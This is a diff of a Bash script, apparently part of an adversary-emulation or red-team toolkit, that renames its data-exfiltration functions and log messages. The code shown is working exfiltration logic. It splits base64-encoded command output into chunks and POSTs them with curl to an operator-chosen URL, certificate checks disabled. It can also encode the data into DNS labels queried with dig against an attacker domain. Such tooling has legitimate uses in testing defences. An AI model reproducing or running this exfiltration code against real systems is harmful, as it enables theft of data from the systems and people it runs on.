@@ -560,13 +560,14 @@ chunk_data() {
     echo "$output"
 }
 
-exfil_http() {
+# Standard exfiltration functions
+exfiltrate_http() {
     local data="$1"
     local url="$2"
     local og_ttp="$TTP_ID"
     TTP_ID="$TTP_ID_EXFIL"
 
-    log_to_stdout "Starting HTTP exfil" "exfil_http" "curl $url"
+    log_to_stdout "Starting HTTP exfiltration" "exfiltrate_http" "curl $url"
     
     local chunks=$(chunk_data "$data" "$CHUNK_SIZE")
     local total=$(echo "$chunks" | wc -l)
@@ -574,24 +575,24 @@ exfil_http() {
 
     echo "$chunks" | while IFS= read -r chunk; do
         local size=${#chunk}
-        log_to_stdout "Sending chunk $count/$total ($size bytes)" "exfil_http" "curl $url"
+        log_to_stdout "Sending chunk $count/$total ($size bytes)" "exfiltrate_http" "curl $url"
         
         if curl -L -s -X POST -d "$chunk" "$url" --insecure -o /dev/null -w "%{http_code}" | grep -q "^2"; then
-            log_to_stdout "Chunk $count/$total sent" "exfil_http" "curl $url"
+            log_to_stdout "Chunk $count/$total sent" "exfiltrate_http" "curl $url"
         else
-            log_to_stdout "Chunk $count/$total failed" "exfil_http" "curl $url"
+            log_to_stdout "Chunk $count/$total failed" "exfiltrate_http" "curl $url"
             TTP_ID="$og_ttp"
             return 1
         fi
         count=$((count + 1))
     done
 
-    log_to_stdout "HTTP exfil complete" "exfil_http" "curl $url"
+    log_to_stdout "HTTP exfiltration complete" "exfiltrate_http" "curl $url"
     TTP_ID="$og_ttp"
     return 0
 }
 
-exfil_dns() {
+exfiltrate_dns() {
     local data="$1"
     local domain="$2"
     local id="$3"
@@ -602,11 +603,11 @@ exfil_dns() {
     local encoded_id=$(echo "$id" | base64 | tr '+/' '-_' | tr -d '=')
     local dns_chunk_size=63  # Fixed max length of a DNS label
 
-    log_to_stdout "Attempting to exfiltrate data via DNS" "exfil_dns" "dig +short ${encoded_id}.id.$domain"
+    log_to_stdout "Attempting to exfiltrate data via DNS" "exfiltrate_dns" "dig +short ${encoded_id}.id.$domain"
 
     # Send the ID first
     if ! dig +short "${encoded_id}.id.$domain" A > /dev/null; then
-        log_to_stdout "Failed to send ID via DNS" "exfil_dns" "dig +short ${encoded_id}.id.$domain"
+        log_to_stdout "Failed to send ID via DNS" "exfiltrate_dns" "dig +short ${encoded_id}.id.$domain"
         TTP_ID=$original_ttp_id
         return 1
     fi
@@ -617,9 +618,9 @@ exfil_dns() {
 
     echo "$chunks" | while IFS= read -r chunk; do
         if dig +short "${chunk}.${chunk_num}.$domain" A > /dev/null; then
-            log_to_stdout "Successfully sent chunk $((chunk_num+1))/$total_chunks via DNS" "exfil_dns" "dig +short ${chunk}.${chunk_num}.$domain"
+            log_to_stdout "Successfully sent chunk $((chunk_num+1))/$total_chunks via DNS" "exfiltrate_dns" "dig +short ${chunk}.${chunk_num}.$domain"
         else
-            log_to_stdout "Failed to send chunk $((chunk_num+1))/$total_chunks via DNS" "exfil_dns" "dig +short ${chunk}.${chunk_num}.$domain"
+            log_to_stdout "Failed to send chunk $((chunk_num+1))/$total_chunks via DNS" "exfiltrate_dns" "dig +short ${chunk}.${chunk_num}.$domain"
             TTP_ID=$original_ttp_id
             return 1
         fi
@@ -627,11 +628,11 @@ exfil_dns() {
     done
 
     if dig +short "end.$domain" A > /dev/null; then
-        log_to_stdout "Successfully completed DNS exfiltration" "exfil_dns" "dig +short end.$domain"
+        log_to_stdout "Successfully completed DNS exfiltration" "exfiltrate_dns" "dig +short end.$domain"
         TTP_ID=$original_ttp_id
         return 0
     else
-        log_to_stdout "Failed to send end signal via DNS" "exfil_dns" "dig +short end.$domain"
+        log_to_stdout "Failed to send end signal via DNS" "exfiltrate_dns" "dig +short end.$domain"
         TTP_ID=$original_ttp_id
         return 1
     fi
@@ -960,13 +961,13 @@ main() {
         fi
 
         if [ "$EXFIL" = true ]; then
-            local exfil_data=$([ -n "$encoded_output" ] && echo "$encoded_output" || echo "$output")
-            local b64_output=$(echo "$exfil_data" | base64)
+            local data_to_exfil=$([ -n "$encoded_output" ] && echo "$encoded_output" || echo "$output")
+            local b64_output=$(echo "$data_to_exfil" | base64)
             if [[ "$EXFIL_METHOD" == http://* ]]; then
-                exfil_http "$b64_output" "$EXFIL_METHOD"
+                exfiltrate_http "$b64_output" "$EXFIL_METHOD"
             elif [[ "$EXFIL_METHOD" == dns=* ]]; then
                 local domain="${EXFIL_METHOD#dns=}"
-                exfil_dns "$b64_output" "$domain" "$(date +%s)"
+                exfiltrate_dns "$b64_output" "$domain" "$(date +%s)"
             fi
         fi
     else
